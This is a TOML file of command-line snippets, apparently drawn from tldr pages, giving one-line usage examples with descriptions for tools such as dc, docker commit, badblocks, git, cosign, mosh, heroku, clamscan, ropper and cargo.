  description = "Show the menu"
  command = "<Alt> + M"
  output = ""

[[snippets]]
  description = "Start an interactive session"
  command = "dc"
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "dc <path/to/script.dc>"
  output = ""

[[snippets]]
  description = "Calculate an expression with the specified scale"
  command = "dc --expression='<10> k <5 3 /> p'"
  output = ""

[[snippets]]
  description = "Calculate 4 times 5 (4 5 *), subtract 17 (17 -), and [p]rint the output"
  command = "dc --expression='4 5 * 17 - p'"
  output = ""

[[snippets]]
  description = "Specify the number of decimal places to 7 (7 k), calculate 5 divided by -3 (5 _3 /) and [p]rint"
  command = "dc --expression='7 k 5 _3 / p'"
  output = ""

[[snippets]]
  description = "Calculate the golden ratio, phi: set number of decimal places to 100 (100 k), square root of 5 (5 v) plus 1 (1 +), divided by 2 (2 /), and [p]rint result"
  command = "dc --expression='100 k 5 v 1 + 2 / p'"
  output = ""

[[snippets]]
  description = "Uninstall a formula/cask"
  command = "brew uninstall <formula|cask>"
  output = ""

[[snippets]]
  description = "Uninstall a cask and remove all associated files"
  command = "brew uninstall --zap <cask>"
  output = ""

[[snippets]]
  description = "Start an interactive Lua shell"
  command = "lua"
  output = ""

[[snippets]]
  description = "Execute a Lua script"
  command = "lua <path/to/script.lua> <--optional-argument>"
  output = ""

[[snippets]]
  description = "Execute a Lua expression"
  command = "lua -e '<print(""Hello World"")>'"
  output = ""

[[snippets]]
  description = "Run `gcpdiag` on your project, returning all rules"
  command = "gcpdiag lint --project=<gcp_project_id>"
  output = ""

[[snippets]]
  description = "Hide rules that are ok"
  command = "gcpdiag lint --project=<gcp_project_id> --hide-ok"
  output = ""

[[snippets]]
  description = "Authenticate using a service account private key file"
  command = "gcpdiag lint --project=<gcp_project_id> --auth-key <path/to/private_key>"
  output = ""

[[snippets]]
  description = "Search logs and metrics from a number of days back (default: 3 days)"
  command = "gcpdiag lint --project=<gcp_project_id> --within-days <number>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gcpdiag lint --help"
  output = ""

[[snippets]]
  description = "Generate documentation from the crate's root"
  command = "rustdoc <src/lib.rs>"
  output = ""

[[snippets]]
  description = "Pass a name for the project"
  command = "rustdoc <src/lib.rs> --crate-name <name>"
  output = ""

[[snippets]]
  description = "Generate documentation from Markdown files"
  command = "rustdoc <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Specify the output directory"
  command = "rustdoc <src/lib.rs> --out-dir <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Create an image from a specific container"
  command = "docker commit <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Apply a `CMD` Dockerfile instruction to the created image"
  command = "docker commit --change=""CMD <command>"" <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Apply an `ENV` Dockerfile instruction to the created image"
  command = "docker commit --change=""ENV <name>=<value>"" <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Create an image with a specific author in the metadata"
  command = "docker commit --author=""<author>"" <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Create an image with a specific comment in the metadata"
  command = "docker commit --message=""<comment>"" <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Create an image without pausing the container during commit"
  command = "docker commit --pause=<false> <container> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker commit --help"
  output = ""

[[snippets]]
  description = "Update PlatformIO to the latest version"
  command = "pio upgrade"
  output = ""

[[snippets]]
  description = "Update PlatformIO to the latest development (unstable) version"
  command = "pio upgrade --dev"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a compressed FIASCO file"
  command = "pnmtofiasco <path/to/file.pnm> > <path/to/file.fiasco>"
  output = ""

[[snippets]]
  description = "Specify the [i]nput files through a pattern"
  command = "pnmtofiasco --image-name ""<img[01-09+1].pnm>"" > <path/to/file.fiasco>"
  output = ""

[[snippets]]
  description = "Specify the compression quality"
  command = "pnmtofiasco --quality <quality_level> <path/to/file.pnm> > <path/to/file.fiasco>"
  output = ""

[[snippets]]
  description = "Load the options to be used from the specified configuration file"
  command = "pnmtofiasco --config <path/to/fiascorc> <path/to/file.pnm> > <path/to/file.fiasco>"
  output = ""

[[snippets]]
  description = "Search a disk for bad blocks by using a non-destructive read-only test"
  command = "sudo badblocks </dev/sdX>"
  output = ""

[[snippets]]
  description = "Search an unmounted disk for bad blocks with a [n]on-destructive read-write test"
  command = "sudo badblocks -n </dev/sdX>"
  output = ""

[[snippets]]
  description = "Search an unmounted disk for bad blocks with a destructive [w]rite test"
  command = "sudo badblocks -w </dev/sdX>"
  output = ""

[[snippets]]
  description = "Use the destructive [w]rite test and [s]how [v]erbose progress"
  command = "sudo badblocks -svw </dev/sdX>"
  output = ""

[[snippets]]
  description = "In destructive mode, [o]utput found blocks to a file"
  command = "sudo badblocks -o <path/to/file> -w </dev/sdX>"
  output = ""

[[snippets]]
  description = "Use the destructive mode with improved speed using 4K [b]lock size and 64K block [c]ount"
  command = "sudo badblocks -w -b <4096> -c <65536> </dev/sdX>"
  output = ""

[[snippets]]
  description = "Display credential information, retrieving the username and password from configuration files"
  command = "echo ""<url=http://example.com>"" | git credential fill"
  output = ""

[[snippets]]
  description = "Send credential information to all configured credential helpers to store for later use"
  command = "echo ""<url=http://example.com>"" | git credential approve"
  output = ""

[[snippets]]
  description = "Erase the specified credential information from all the configured credential helpers"
  command = "echo ""<url=http://example.com>"" | git credential reject"
  output = ""

[[snippets]]
  description = "Run backups using the default `phpbu.xml` configuration file"
  command = "phpbu"
  output = ""

[[snippets]]
  description = "Run backups using a specific configuration file"
  command = "phpbu --configuration=<path/to/configuration_file.xml>"
  output = ""

[[snippets]]
  description = "Only run the specified backups"
  command = "phpbu --limit=<backup_task_name>"
  output = ""

[[snippets]]
  description = "Simulate the actions that would have been performed"
  command = "phpbu --simulate"
  output = ""

[[snippets]]
  description = "Register the current repository in the user's list of repositories to daily have maintenance run"
  command = "git maintenance register"
  output = ""

[[snippets]]
  description = "Start running maintenance on the current repository"
  command = "git maintenance start"
  output = ""

[[snippets]]
  description = "Halt the background maintenance schedule for the current repository"
  command = "git maintenance stop"
  output = ""

[[snippets]]
  description = "Remove the current repository from the user's maintenance repository list"
  command = "git maintenance unregister"
  output = ""

[[snippets]]
  description = "Run a specific maintenance task on the current repository"
  command = "git maintenance run --task=<commit-graph|gc|incremental-repack|loose-objects|pack-refs|prefetch>"
  output = ""

[[snippets]]
  description = "Commit staged files to the repository with a message"
  command = "git commit --message ""<message>"""
  output = ""

[[snippets]]
  description = "Commit staged files with a message read from a file"
  command = "git commit --file <path/to/commit_message_file>"
  output = ""

[[snippets]]
  description = "Auto stage all modified and deleted files and commit with a message"
  command = "git commit --all --message ""<message>"""
  output = ""

[[snippets]]
  description = "Commit staged files and sign them with the specified GPG key (or the one defined in the configuration file if no argument is specified)"
  command = "git commit --gpg-sign <key_id> --message ""<message>"""
  output = ""

[[snippets]]
  description = "Update the last commit by adding the currently staged changes, changing the commit's hash"
  command = "git commit --amend"
  output = ""

[[snippets]]
  description = "Commit only specific (already staged) files"
  command = "git commit <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Create a commit, even if there are no staged files"
  command = "git commit --message ""<message>"" --allow-empty"
  output = ""

[[snippets]]
  description = "Recreate the `texlive.tlpdb` database file and dump it to `stdout`"
  command = "sudo tlmgr recreate-tlpdb"
  output = ""

[[snippets]]
  description = "Return a successful exit code"
  command = ":"
  output = ""

[[snippets]]
  description = "Make a command always exit with 0"
  command = "<command> || :"
  output = ""

[[snippets]]
  description = "Post a file to Slack"
  command = "slackcat --channel <channel_name> <path/to/file>"
  output = ""

[[snippets]]
  description = "Post a file to Slack with a custom filename"
  command = "slackcat --channel <channel_name> --filename=<filename> <path/to/file>"
  output = ""

[[snippets]]
  description = "Pipe command output to Slack as a text snippet"
  command = "<command> | slackcat --channel <channel_name> --filename=<snippet_name>"
  output = ""

[[snippets]]
  description = "Stream command output to Slack continuously"
  command = "<command> | slackcat --channel <channel_name> --stream"
  output = ""

[[snippets]]
  description = "Probe a block device"
  command = "sudo f3probe <path/to/block_device>"
  output = ""

[[snippets]]
  description = "Use the minimum about of RAM possible"
  command = "sudo f3probe --min-memory <path/to/block_device>"
  output = ""

[[snippets]]
  description = "Time disk operations"
  command = "sudo f3probe --time-ops <path/to/block_device>"
  output = ""

[[snippets]]
  description = "Run the specified command with uncompressed versions of the compressed argument files"
  command = "zrun <cat path/to/file1.gz path/to/file2.bz2 ...>"
  output = ""

[[snippets]]
  description = "Compress a PNG file"
  command = "pngcrush <in.png> <out.png>"
  output = ""

[[snippets]]
  description = "Compress all PNGs and output them to the specified directory"
  command = "pngcrush -d <path/to/output> *.png"
  output = ""

[[snippets]]
  description = "Compress PNG file with all 114 available algorithms and pick the best result"
  command = "pngcrush -rem allb -brute -reduce <in.png> <out.png>"
  output = ""

[[snippets]]
  description = "Start the editor"
  command = "nano"
  output = ""

[[snippets]]
  description = "Start the editor without using configuration files"
  command = "nano --ignorercfiles"
  output = ""

[[snippets]]
  description = "Open specific files, moving to the next file when closing the previous one"
  command = "nano <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open a file and position the cursor at a specific line and column"
  command = "nano +<line>,<column> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file and enable soft wrapping"
  command = "nano --softwrap <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file and indent new lines to the previous line's indentation"
  command = "nano --autoindent <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file and create a backup file (`path/to/file~`) on save"
  command = "nano --backup <path/to/file>"
  output = ""

[[snippets]]
  description = "Display the current mask in octal notation"
  command = "umask"
  output = ""

[[snippets]]
  description = "Display the current mask in symbolic (human-readable) mode"
  command = "umask -S"
  output = ""

[[snippets]]
  description = "Change the mask symbolically to allow read permission for all users (the rest of the mask bits are unchanged)"
  command = "umask <a+r>"
  output = ""

[[snippets]]
  description = "Set the mask (using octal) to restrict no permissions for the file's owner, and restrict all permissions for everyone else"
  command = "umask <077>"
  output = ""

[[snippets]]
  description = "Initialize and configure the Blackfire client"
  command = "blackfire config"
  output = ""

[[snippets]]
  description = "Launch the Blackfire agent"
  command = "blackfire agent"
  output = ""

[[snippets]]
  description = "Launch the Blackfire agent on a specific socket"
  command = "blackfire agent --socket=""<tcp://127.0.0.1:8307>"""
  output = ""

[[snippets]]
  description = "Run the profiler on a specific program"
  command = "blackfire run <php path/to/file.php>"
  output = ""

[[snippets]]
  description = "Run the profiler and collect 10 samples"
  command = "blackfire --samples=<10> run <php path/to/file.php>"
  output = ""

[[snippets]]
  description = "Run the profiler and output results as JSON"
  command = "blackfire --json run <php path/to/file.php>"
  output = ""

[[snippets]]
  description = "Upload a profiler file to the Blackfire web service"
  command = "blackfire upload <path/to/file>"
  output = ""

[[snippets]]
  description = "View the status of profiles on the Blackfire web service"
  command = "blackfire status"
  output = ""

[[snippets]]
  description = "Format all source files"
  command = "cargo fmt"
  output = ""

[[snippets]]
  description = "Check for formatting errors without writing to the files"
  command = "cargo fmt --check"
  output = ""

[[snippets]]
  description = "Pass arguments to each `rustfmt` call"
  command = "cargo fmt -- <rustfmt_args>"
  output = ""

[[snippets]]
  description = "Add a target to a toolchain"
  command = "rustup target add --toolchain <toolchain> <target>"
  output = ""

[[snippets]]
  description = "Remove a target from a toolchain"
  command = "rustup target remove --toolchain <toolchain> <target>"
  output = ""

[[snippets]]
  description = "List available and installed targets for a toolchain"
  command = "rustup target list --toolchain <toolchain>"
  output = ""

[[snippets]]
  description = "List installed targets for a toolchain"
  command = "rustup target list --toolchain <toolchain> --installed"
  output = ""

[[snippets]]
  description = "Connect to a remote server"
  command = "mosh <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect to a remote server with a specific identity (private key)"
  command = "mosh --ssh=""ssh -i <path/to/key_file>"" <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect to a remote server using a specific port"
  command = "mosh --ssh=""ssh -p <2222>"" <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Run a command on a remote server"
  command = "mosh <remote_host> -- <command -with -flags>"
  output = ""

[[snippets]]
  description = "Select Mosh UDP port (useful when `remote_host` is behind a NAT)"
  command = "mosh -p <124> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Usage when `mosh-server` binary is outside standard path"
  command = "mosh --server=<path/to/bin/>mosh-server <remote_host>"
  output = ""

[[snippets]]
  description = "Initialize a new Dolt data repository in the current directory"
  command = "dolt init"
  output = ""

[[snippets]]
  description = "Initialize a new Dolt data repository creating a commit with the specified metadata"
  command = "dolt init --name ""<name>"" --email ""<email>"" --date ""<2021-12-31T00:00:00>"" -b ""<branch_name>"""
  output = ""

[[snippets]]
  description = "Show general help and available subcommands"
  command = "pueue --help"
  output = ""

[[snippets]]
  description = "Execute a pueue subcommand"
  command = "pueue <subcommand>"
  output = ""

[[snippets]]
  description = "Check the version of pueue"
  command = "pueue --version"
  output = ""

[[snippets]]
  description = "Generate a key-pair"
  command = "cosign generate-key-pair"
  output = ""

[[snippets]]
  description = "Sign a container and store the signature in the registry"
  command = "cosign sign -key <cosign.key> <image>"
  output = ""

[[snippets]]
  description = "Sign a container image with a key pair stored in a Kubernetes secret"
  command = "cosign sign -key k8s://<namespace>/<key> <image>"
  output = ""

[[snippets]]
  description = "Sign a blob with a local key pair file"
  command = "cosign sign-blob --key <cosign.key> <path/to/file>"
  output = ""

[[snippets]]
  description = "Verify a container against a public key"
  command = "cosign verify -key <cosign.pub> <image>"
  output = ""

[[snippets]]
  description = "Verify images with a public key in a Dockerfile"
  command = "cosign dockerfile verify -key <cosign.pub> <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Verify an image with a public key stored in a Kubernetes secret"
  command = "cosign verify -key k8s://<namespace>/<key> <image>"
  output = ""

[[snippets]]
  description = "Copy a container image and its signatures"
  command = "cosign copy <example.com/src:latest> <example.com/dest:latest>"
  output = ""

[[snippets]]
  description = "Associate the local install of `asciinema` with an asciinema.org account"
  command = "asciinema auth"
  output = ""

[[snippets]]
  description = "Make a new recording (finish it with `Ctrl+D` or type `exit`, and then choose to upload it or save it locally)"
  command = "asciinema rec"
  output = ""

[[snippets]]
  description = "Make a new recording and save it to a local file"
  command = "asciinema rec <path/to/recording.cast>"
  output = ""

[[snippets]]
  description = "Replay a terminal recording from a local file"
  command = "asciinema play <path/to/recording.cast>"
  output = ""

[[snippets]]
  description = "Replay a terminal recording hosted on <https://asciinema.org>"
  command = "asciinema play https://asciinema.org/a/<cast_id>"
  output = ""

[[snippets]]
  description = "Make a new recording, limiting any [i]dle time to at most 2.5 seconds"
  command = "asciinema rec -i 2.5"
  output = ""

[[snippets]]
  description = "Print the full output of a locally saved recording"
  command = "asciinema cat <path/to/recording.cast>"
  output = ""

[[snippets]]
  description = "Upload a locally saved terminal session to asciinema.org"
  command = "asciinema upload <path/to/recording.cast>"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a RAST image"
  command = "pnmtorast <path/to/input.pnm> > <path/to/output.rast>"
  output = ""

[[snippets]]
  description = "Force either `RT_STANDARD` or `RT_BYTE_ENCODED` form for the output"
  command = "pnmtorast -<standard|rle> <path/to/input.pnm> > <path/to/output.rast>"
  output = ""

[[snippets]]
  description = "Commit changes with a generated message"
  command = "git magic"
  output = ""

[[snippets]]
  description = "[a]dd untracked files and commit changes with a generated message"
  command = "git magic -a"
  output = ""

[[snippets]]
  description = "Commit changes with a custom [m]essage"
  command = "git magic -m ""<custom_commit_message>"""
  output = ""

[[snippets]]
  description = "[e]dit the commit [m]essage before committing"
  command = "git magic -em ""<custom_commit_message>"""
  output = ""

[[snippets]]
  description = "Commit changes and [p]ush to remote"
  command = "git magic -p"
  output = ""

[[snippets]]
  description = "Commit changes with a [f]orce [p]ush to remote"
  command = "git magic -fp"
  output = ""

[[snippets]]
  description = "Log in to your Heroku account"
  command = "heroku login"
  output = ""

[[snippets]]
  description = "Create a Heroku app"
  command = "heroku create"
  output = ""

[[snippets]]
  description = "Show logs for an app"
  command = "heroku logs --app <app_name>"
  output = ""

[[snippets]]
  description = "Run a one-off process inside a dyno (Heroku virtual machine)"
  command = "heroku run <process_name> --app <app_name>"
  output = ""

[[snippets]]
  description = "List dynos (Heroku virtual machines) for an app"
  command = "heroku ps --app <app_name>"
  output = ""

[[snippets]]
  description = "Permanently destroy an app"
  command = "heroku destroy --app <app_name>"
  output = ""

[[snippets]]
  description = "Start a new stopwatch, giving a tag name to the activity being tracked"
  command = "timew start <activity_tag>"
  output = ""

[[snippets]]
  description = "View running stopwatches"
  command = "timew"
  output = ""

[[snippets]]
  description = "Stop the stopwatch with a given tag name"
  command = "timew stop <activity_tag>"
  output = ""

[[snippets]]
  description = "Stop all running stopwatches"
  command = "timew stop"
  output = ""

[[snippets]]
  description = "View tracked items"
  command = "timew summary"
  output = ""

[[snippets]]
  description = "Create the ESLint configuration file"
  command = "eslint --init"
  output = ""

[[snippets]]
  description = "Lint one or more files"
  command = "eslint <path/to/file1.js path/to/file2.js ...>"
  output = ""

[[snippets]]
  description = "Fix lint issues"
  command = "eslint --fix"
  output = ""

[[snippets]]
  description = "Lint using the specified configuration file"
  command = "eslint -c <path/to/config_file> <path/to/file1.js path/to/file2.js>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xz"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xz"
  output = ""

[[snippets]]
  description = "Run an Elixir file"
  command = "elixir <path/to/file>"
  output = ""

[[snippets]]
  description = "Evaluate Elixir code by passing it as an argument"
  command = "elixir -e ""<code>"""
  output = ""

[[snippets]]
  description = "Display basic information about the current app and available commands"
  command = "cake"
  output = ""

[[snippets]]
  description = "List available routes"
  command = "cake routes"
  output = ""

[[snippets]]
  description = "Clear configuration caches"
  command = "cake cache clear_all"
  output = ""

[[snippets]]
  description = "Build the metadata cache"
  command = "cake schema_cache build --connection <connection>"
  output = ""

[[snippets]]
  description = "Clear the metadata cache"
  command = "cake schema_cache clear"
  output = ""

[[snippets]]
  description = "Clear a single cache table"
  command = "cake schema_cache clear <table_name>"
  output = ""

[[snippets]]
  description = "Start a development web server (defaults to port 8765)"
  command = "cake server"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "cake console"
  output = ""

[[snippets]]
  description = "Download images from the specified URL"
  command = "gallery-dl ""<url>"""
  output = ""

[[snippets]]
  description = "Retrieve pre-existing cookies from your web browser (useful for sites that require login)"
  command = "gallery-dl --cookies-from-browser <browser> ""<url>"""
  output = ""

[[snippets]]
  description = "Get the direct URL of an image from a site supporting authentication with username and password"
  command = "gallery-dl --get-urls --username <username> --password <password> ""<url>"""
  output = ""

[[snippets]]
  description = "Filter manga chapters by chapter number and language"
  command = "gallery-dl --chapter-filter ""<10 <= chapter < 20>"" --option ""lang=<language_code>"" ""<url>"""
  output = ""

[[snippets]]
  description = "Compute a checksum with BSD-compatible algorithm and 1024-byte blocks"
  command = "sum <path/to/file>"
  output = ""

[[snippets]]
  description = "Compute a checksum with System V-compatible algorithm and 512-byte blocks"
  command = "sum --sysv <path/to/file>"
  output = ""

[[snippets]]
  description = "Print all branches which are merged into the current head"
  command = "git show-merged-branches"
  output = ""

[[snippets]]
  description = "Upload a file"
  command = "ffsend upload <path/to/file>"
  output = ""

[[snippets]]
  description = "Download a file"
  command = "ffsend download <url>"
  output = ""

[[snippets]]
  description = "Upload a file with password"
  command = "ffsend upload <path/to/file> -p <password>"
  output = ""

[[snippets]]
  description = "Download a file protected by password"
  command = "ffsend download <path/to/file> -p <password>"
  output = ""

[[snippets]]
  description = "Upload a file and allow 4 downloads"
  command = "ffsend upload <path/to/file> -d <4>"
  output = ""

[[snippets]]
  description = "Initialize a swarm cluster"
  command = "docker swarm init"
  output = ""

[[snippets]]
  description = "Display the token to join a manager or a worker"
  command = "docker swarm join-token <worker|manager>"
  output = ""

[[snippets]]
  description = "Join a new node to the cluster"
  command = "docker swarm join --token <token> <manager_node_url:2377>"
  output = ""

[[snippets]]
  description = "Remove a worker from the swarm (run inside the worker node)"
  command = "docker swarm leave"
  output = ""

[[snippets]]
  description = "Display the current CA certificate in PEM format"
  command = "docker swarm ca"
  output = ""

[[snippets]]
  description = "Rotate the current CA certificate and display the new certificate"
  command = "docker swarm ca --rotate"
  output = ""

[[snippets]]
  description = "Change the valid period for node certificates"
  command = "docker swarm update --cert-expiry <hours>h<minutes>m<seconds>s"
  output = ""

[[snippets]]
  description = "Start CouchDB"
  command = "couchdb"
  output = ""

[[snippets]]
  description = "Start CouchDB interactive shell"
  command = "couchdb -i"
  output = ""

[[snippets]]
  description = "Start CouchDB as a background process"
  command = "couchdb -b"
  output = ""

[[snippets]]
  description = "Kill the background process (Note: It will respawn if needed)"
  command = "couchdb -k"
  output = ""

[[snippets]]
  description = "Shutdown the background process"
  command = "couchdb -d"
  output = ""

[[snippets]]
  description = "Scan a file for vulnerabilities"
  command = "clamscan <path/to/file>"
  output = ""

[[snippets]]
  description = "Scan all files recursively in a specific directory"
  command = "clamscan -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Scan data from `stdin`"
  command = "<command> | clamscan -"
  output = ""

[[snippets]]
  description = "Specify a virus database file or directory of files"
  command = "clamscan --database <path/to/database_file_or_directory>"
  output = ""

[[snippets]]
  description = "Scan the current directory and output only infected files"
  command = "clamscan --infected"
  output = ""

[[snippets]]
  description = "Print the scan report to a log file"
  command = "clamscan --log <path/to/log_file>"
  output = ""

[[snippets]]
  description = "Move infected files to a specific directory"
  command = "clamscan --move <path/to/quarantine_directory>"
  output = ""

[[snippets]]
  description = "Remove infected files"
  command = "clamscan --remove yes"
  output = ""

[[snippets]]
  description = "Run a `pyATS` subcommand"
  command = "pyats <subcommand>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pyats --help"
  output = ""

[[snippets]]
  description = "Display help about a specific subcommand"
  command = "pyats <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pyats version check"
  output = ""

[[snippets]]
  description = "Lint all JavaScript source files in the current directory"
  command = "standard"
  output = ""

[[snippets]]
  description = "Lint specific JavaScript file(s)"
  command = "standard <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Apply automatic fixes during linting"
  command = "standard --fix"
  output = ""

[[snippets]]
  description = "Declare any available global variables"
  command = "standard --global <variable>"
  output = ""

[[snippets]]
  description = "Use a custom ESLint plugin when linting"
  command = "standard --plugin <plugin>"
  output = ""

[[snippets]]
  description = "Use a custom JS parser when linting"
  command = "standard --parser <parser>"
  output = ""

[[snippets]]
  description = "Use a custom ESLint environment when linting"
  command = "standard --env <environment>"
  output = ""

[[snippets]]
  description = "Scale up a PAM image by an integer factor"
  command = "pamstretch <N> <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Scale up a PAM image by the specified factors in the horizontal and vertical directions"
  command = "pamstretch -xscale <XN> -yscale <YN> <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Create a Git repository in the current directory and commit all files"
  command = "git setup"
  output = ""

[[snippets]]
  description = "Create a Git repository in a specific directory and commit all files"
  command = "git setup <path/to/directory>"
  output = ""

[[snippets]]
  description = "Convert colors from one format to another. Here from RGB to HSL"
  command = "pastel format <hsl> <ff8000>"
  output = ""

[[snippets]]
  description = "Show and analyze colors on the terminal"
  command = "pastel color ""<rgb(255,50,127)>"""
  output = ""

[[snippets]]
  description = "Pick a color from somewhere on the screen"
  command = "pastel pick"
  output = ""

[[snippets]]
  description = "Generate a set of N visually distinct colors"
  command = "pastel distinct <8>"
  output = ""

[[snippets]]
  description = "List all X11/CSS color names"
  command = "pastel list"
  output = ""

[[snippets]]
  description = "List all supported raster formats"
  command = "gdalinfo --formats"
  output = ""

[[snippets]]
  description = "List information about a specific raster dataset"
  command = "gdalinfo <path/to/input.tif>"
  output = ""

[[snippets]]
  description = "List information about a specific raster dataset in JSON format"
  command = "gdalinfo -json <path/to/input.tif>"
  output = ""

[[snippets]]
  description = "Show histogram values of a specific raster dataset"
  command = "gdalinfo -hist <path/to/input.tif>"
  output = ""

[[snippets]]
  description = "List information about a Web Map Service (WMS)"
  command = "gdalinfo WMS:<https://services.meggsimum.de/geoserver/ows>"
  output = ""

[[snippets]]
  description = "List information about a specific dataset of a Web Map Service (WMS)"
  command = "gdalinfo WMS:<https://services.meggsimum.de/geoserver/ows> -sd <4>"
  output = ""

[[snippets]]
  description = "Search for a Haxe library"
  command = "haxelib search <keyword>"
  output = ""

[[snippets]]
  description = "Install a Haxe library"
  command = "haxelib install <libname>"
  output = ""

[[snippets]]
  description = "Install a specific version of a Haxe library"
  command = "haxelib install <libname> <version>"
  output = ""

[[snippets]]
  description = "Upgrade all installed Haxe libraries"
  command = "haxelib upgrade"
  output = ""

[[snippets]]
  description = "Install the development version of a library from a Git repository"
  command = "haxelib git <libname> <git_url>"
  output = ""

[[snippets]]
  description = "Uninstall a Haxe library"
  command = "haxelib remove <libname>"
  output = ""

[[snippets]]
  description = "Print a tree of locally installed Haxe libraries"
  command = "haxelib list"
  output = ""

[[snippets]]
  description = "Declare a string variable with the specified value"
  command = "local <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an integer variable with the specified value"
  command = "local -i <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an array variable with the specified value"
  command = "local <variable>=(<item_a item_b item_c>)"
  output = ""

[[snippets]]
  description = "Declare an associative array variable with the specified value"
  command = "local -A <variable>=(<[key_a]=item_a [key_b]=item_b [key_c]=item_c>)"
  output = ""

[[snippets]]
  description = "Declare a readonly variable with the specified value"
  command = "local -r <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Convert file to a specific encoding, and print to `stdout`"
  command = "iconv -f <from_encoding> -t <to_encoding> <input_file>"
  output = ""

[[snippets]]
  description = "Convert file to the current locale's encoding, and output to a file"
  command = "iconv -f <from_encoding> <input_file> > <output_file>"
  output = ""

[[snippets]]
  description = "List supported encodings"
  command = "iconv -l"
  output = ""

[[snippets]]
  description = "Convert a RAST image to a PNM file"
  command = "rasttopnm <path/to/input.rast> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Use the color map indices in the raster if they are color values"
  command = "rasttopnm -index <path/to/input.rast> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "List gadgets in the binary file"
  command = "ropper --file <path/to/binary>"
  output = ""

[[snippets]]
  description = "Filter gadgets in the binary file by a regular expression"
  command = "ropper --file <path/to/binary> --search <regex>"
  output = ""

[[snippets]]
  description = "List gadgets of specified type in the binary file"
  command = "ropper --file <path/to/binary> --type <rop|job|sys|all>"
  output = ""

[[snippets]]
  description = "Exclude bad byte gadgets in the binary file"
  command = "ropper --file <path/to/binary> --badbytes <byte_string>"
  output = ""

[[snippets]]
  description = "List gadgets up to the specified instruction count in the binary file"
  command = "ropper --file <path/to/binary> --inst-count <count>"
  output = ""

[[snippets]]
  description = "Show the remote addresses table only"
  command = "bandwhich --addresses"
  output = ""

[[snippets]]
  description = "Show DNS queries"
  command = "bandwhich --show-dns"
  output = ""

[[snippets]]
  description = "Show total (cumulative) usage"
  command = "bandwhich --total-utilization"
  output = ""

[[snippets]]
  description = "Show the network utilization for a specific network interface"
  command = "bandwhich --interface <eth0>"
  output = ""

[[snippets]]
  description = "Show DNS queries with a given DNS server"
  command = "bandwhich --show-dns --dns-server <dns_server_ip>"
  output = ""

[[snippets]]
  description = "Upload a new site to surge.sh"
  command = "surge <path/to/my_project>"
  output = ""

[[snippets]]
  description = "Deploy site to custom domain (note that the DNS records must point to the surge.sh subdomain)"
  command = "surge <path/to/my_project> <my_custom_domain.com>"
  output = ""

[[snippets]]
  description = "List your surge projects"
  command = "surge list"
  output = ""

[[snippets]]
  description = "Remove a project"
  command = "surge teardown <my_custom_domain.com>"
  output = ""

[[snippets]]
  description = "Compile resources referenced in `file.gresource.xml` to a .gresource binary"
  command = "glib-compile-resources <file.gresource.xml>"
  output = ""

[[snippets]]
  description = "Compile resources referenced in `file.gresource.xml` to a C source file"
  command = "glib-compile-resources --generate-source <file.gresource.xml>"
  output = ""

[[snippets]]
  description = "Compile resources in `file.gresource.xml` to a chosen target file, with `.c`, `.h` or `.gresource` extension"
  command = "glib-compile-resources --generate --target=<file.ext> <file.gresource.xml>"
  output = ""

[[snippets]]
  description = "Print a list of resource files referenced in `file.gresource.xml`"
  command = "glib-compile-resources --generate-dependencies <file.gresource.xml>"
  output = ""

[[snippets]]
  description = "Run checks over the code in the current directory"
  command = "cargo clippy"
  output = ""

[[snippets]]
  description = "Require that `Cargo.lock` is up to date"
  command = "cargo clippy --locked"
  output = ""

[[snippets]]
  description = "Run checks on all packages in the workspace"
  command = "cargo clippy --workspace"
  output = ""

[[snippets]]
  description = "Run checks for a package"
  command = "cargo clippy --package <package>"
  output = ""

[[snippets]]
  description = "Treat warnings as errors"
  command = "cargo clippy -- --deny warnings"
  output = ""

[[snippets]]
  description = "Run checks and ignore warnings"
  command = "cargo clippy -- --allow warnings"
  output = ""

[[snippets]]
  description = "Apply Clippy suggestions automatically"
  command = "cargo clippy --fix"
  output = ""

[[snippets]]
  description = "Display the path to the binary in the default toolchain"
  command = "rustup which <command>"
  output = ""

[[snippets]]
  description = "Display the path to the binary in the specified toolchain (see `rustup help toolchain` for more information)"
  command = "rustup which --toolchain <toolchain> <command>"
  output = ""

[[snippets]]
  description = "Display the directory stack with a space between each entry"
  command = "dirs"
  output = ""

[[snippets]]
  description = "Display the directory stack with one entry per line"
  command = "dirs -p"
  output = ""

[[snippets]]
  description = "Display only the nth entry in the directory stack, starting at 0"
  command = "dirs +<N>"
  output = ""

[[snippets]]
  description = "Clear the directory stack"
  command = "dirs -c"
  output = ""

